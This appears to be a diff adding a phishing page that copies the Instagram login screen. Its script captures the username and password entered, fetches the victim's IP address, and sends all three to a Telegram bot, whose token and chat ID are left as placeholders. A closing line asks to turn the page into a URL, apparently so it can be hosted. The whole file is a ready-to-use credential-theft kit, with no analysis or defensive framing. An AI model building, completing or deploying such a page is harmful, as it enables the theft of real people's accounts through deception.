@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        body {
+            background-color: #fafafa;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            max-width: 350px;
+            width: 100%;
+        }
+        .login-box {
+            background-color: #ffffff;
+            border: 1px solid #dbdbdb;
+            padding: 20px 40px;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        .instagram-logo {
+            margin: 20px auto;
+            width: 175px;
+        }
+        input[type="text"],
+        input[type="password"] {
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            color: #262626;
+            font-size: 12px;
+            padding: 9px 8px;
+            margin-bottom: 6px;
+            width: 100%;
+            box-sizing: border-box;
+        }
+        button {
+            background-color: #0095f6;
+            border: none;
+            border-radius: 8px;
+            color: #ffffff;
+            font-weight: 600;
+            padding: 7px;
+            width: 100%;
+            margin-top: 8px;
+        }
+        .separator {
+            display: flex;
+            align-items: center;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+            margin: 15px 0;
+        }
+        .separator::before,
+        .separator::after {
+            content: "";
+            flex: 1;
+            border-top: 1px solid #dbdbdb;
+            margin: 0 10px;
+        }
+        .fb-login {
+            color: #385185;
+            font-weight: 600;
+            font-size: 14px;
+            text-decoration: none;
+            margin: 10px 0;
+            display: block;
+        }
+        .forgot-pw {
+            color: #00376b;
+            font-size: 12px;
+            text-decoration: none;
+        }
+        .signup-box {
+            background-color: #ffffff;
+            border: 1px solid #dbdbdb;
+            padding: 20px;
+            text-align: center;
+            font-size: 14px;
+        }
+        .signup-box a {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        .app-download {
+            text-align: center;
+            margin-top: 20px;
+        }
+        .app-badges img {
+            height: 40px;
+            margin: 5px;
+        }
+        #formMessage {
+            font-size: 14px;
+            margin-top: 15px;
+        }
+        .success { color: #0095f6; }
+        .error { color: #ed4956; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Main Login Box -->
+        <div class="login-box">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram" class="instagram-logo">
+            <form id="loginForm">
+                <input type="text" placeholder="Phone number, username, or email" id="username" required>
+                <input type="password" placeholder="Password" id="password" required>
+                <button type="submit">Log in</button>
+            </form>
+            
+            <div class="separator">OR</div>
+            
+            <a href="#" class="fb-login">Log in with Facebook</a>
+            <a href="#" class="forgot-pw">Forgot password?</a>
+        </div>
+
+        <!-- Sign Up Prompt -->
+        <div class="signup-box">
+            Don't have an account? <a href="#">Sign up</a>
+        </div>
+
+        <!-- Get the App -->
+        <div class="app-download">
+            <p>Get the app.</p>
+            <div class="app-badges">
+                <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5jp7Ym-U-J.png" alt="Get it on Google Play">
+                <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Download from Microsoft">
+            </div>
+        </div>
+        <!-- Message for user -->
+        <p id="formMessage"></p>
+    </div>
+
+    <script>
+        // Replace these with YOUR actual bot token and chat ID
+        const BOT_TOKEN = 'bot_token';
+        const CHAT_ID = 'chat id ';
+
+        document.getElementById('loginForm').addEventListener('submit', async function(event) {
+            event.preventDefault(); // Stop the form from reloading the page
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const messageElement = document.getElementById('formMessage');
+
+            // Get the user's IP address
+            let ipAddress = 'Unknown';
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                ipAddress = ipData.ip;
+            } catch (ipError) {
+                console.error('Could not fetch IP address:', ipError);
+            }
+
+            // Prepare the message for Telegram
+            const messageText = `?? New Instagram Login Attempt:\n?? Username: ${username}\n?? Password: ${password}\n?? IP Address: ${ipAddress}`;
+            const encodedMessage = encodeURIComponent(messageText);
+
+            // Construct the Telegram API URL:cite[8]
+            const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedMessage}`;
+
+            // Send the data to Telegram:cite[8]
+            try {
+                const response = await fetch(telegramApiUrl);
+                const data = await response.json();
+
+                if (data.ok) {
+                    messageElement.textContent = 'Info sent successfully!';
+                    messageElement.className = 'success';
+                    document.getElementById('loginForm').reset();
+                } else {
+                    messageElement.textContent = 'There was an error. Please check your connection.';
+                    messageElement.className = 'error';
+                }
+            } catch (error) {
+                console.error('Error sending message to Telegram:', error);
+                messageElement.textContent = 'A network error occurred.';
+                messageElement.className = 'error';
+            }
+        });
+    </script>
+</body>
+</html>convert this html code into url
